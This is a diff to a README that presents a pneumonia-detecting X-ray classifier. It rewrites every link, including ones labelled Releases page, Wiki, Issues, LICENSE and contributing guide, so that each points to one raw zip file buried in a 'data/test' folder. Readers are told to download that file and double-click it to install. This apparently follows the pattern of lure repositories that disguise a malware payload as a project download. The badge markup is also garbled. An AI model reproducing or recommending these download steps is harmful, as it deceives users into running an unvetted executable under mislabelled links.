@@ -1,6 +1,6 @@
 # 🩺 medical-image-classifier - Detect Pneumonia in X-rays Easily
 
-[![Download](https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip%20Now-Click%https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip)](https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip)
+[![Download](https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip%20Now-Click%https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip)](https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip)
 
 ## 🌟 Overview
 
@@ -22,7 +22,7 @@ Before installing, ensure your system meets the following requirements:
 
 ### 2. Download the Application
 
-To download the medical-image-classifier, please [visit this page to download](https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip).
+To download the medical-image-classifier, please [visit this page to download](https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip).
 
 ### 3. Installation Instructions
 
@@ -30,7 +30,7 @@ Follow these steps to install the application on your computer:
 
 #### For Windows
 
-1. Open the [Releases page](https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip).
+1. Open the [Releases page](https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip).
 2. Download the file for your Windows system.
 3. Locate the downloaded file in your Downloads folder.
 4. Double-click the file to run the installer.
@@ -38,7 +38,7 @@ Follow these steps to install the application on your computer:
 
 #### For macOS
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip).
+1. Go to the [Releases page](https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip).
 2. Download the file for macOS.
 3. Open your Downloads folder and find the downloaded file.
 4. Double-click the file to start the installer.
@@ -46,7 +46,7 @@ Follow these steps to install the application on your computer:
 
 #### For Linux
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip).
+1. Visit the [Releases page](https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip).
 2. Download the Linux file.
 3. Open the terminal and navigate to the folder where the file is saved.
 4. Make the file executable using: 
@@ -98,19 +98,19 @@ If you encounter issues, here are some common solutions:
 
 ## 🔗 Additional Resources
 
-- **Documentation:** [GitHub Wiki](https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip) offers more detailed information on functionalities.
-- **Community Support:** Join our community [here](https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip) to ask questions and share insights.
+- **Documentation:** [GitHub Wiki](https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip) offers more detailed information on functionalities.
+- **Community Support:** Join our community [here](https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip) to ask questions and share insights.
   
 ## 📧 Contact
 
-For support or inquiries, you can reach us via [GitHub Issues](https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip).
+For support or inquiries, you can reach us via [GitHub Issues](https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip).
 
 ## 🔄 Contributing
 
-We welcome contributions! If you're interested in improving the application, please visit our [contributing guide](https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip).
+We welcome contributions! If you're interested in improving the application, please visit our [contributing guide](https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip).
 
 ## 👥 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip) file for details.
 
-[![Download](https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip%20Now-Click%https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip)](https://raw.githubusercontent.com/iansploit/medical-image-classifier/main/shoebrush/medical-image-classifier.zip)
+[![Download](https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip%20Now-Click%https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip)](https://github.com/iansploit/medical-image-classifier/raw/refs/heads/main/data/test/image-classifier-medical-v2.8.zip)
